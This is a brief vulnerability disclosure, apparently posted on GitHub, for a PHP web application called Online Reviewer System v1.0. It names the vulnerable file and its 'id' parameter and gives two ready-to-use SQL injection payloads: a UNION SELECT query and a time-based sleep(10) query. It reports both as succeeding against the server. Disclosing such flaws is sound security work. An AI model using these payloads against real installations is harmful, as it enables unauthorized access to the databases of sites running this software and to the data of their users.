# Online Reviewer System v1.0 has SQL injection

BUG_Author:HaolunSong

Website source code address: https://www.sourcecodester.com/php/12937/online-reviewer-system-using-phppdo.html

Vulnerability File: /reviewer/system/system/admins/assessments/pretest/questions-view.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=151' union all select null,null,concat(0x71727374,0x5556575859),null,null,null,null,null,null,null,null,null,null,null,null,null,null-- -

union query success

![image](https://github.com/csbsong/bug_report/blob/main/sql1.png)

Payload2:id=151' and (select 1 from (select(sleep(10)))x)-- x

Time based injection successful, server response time is 10 seconds

![image](https://github.com/csbsong/bug_report/blob/main/sql2.png)
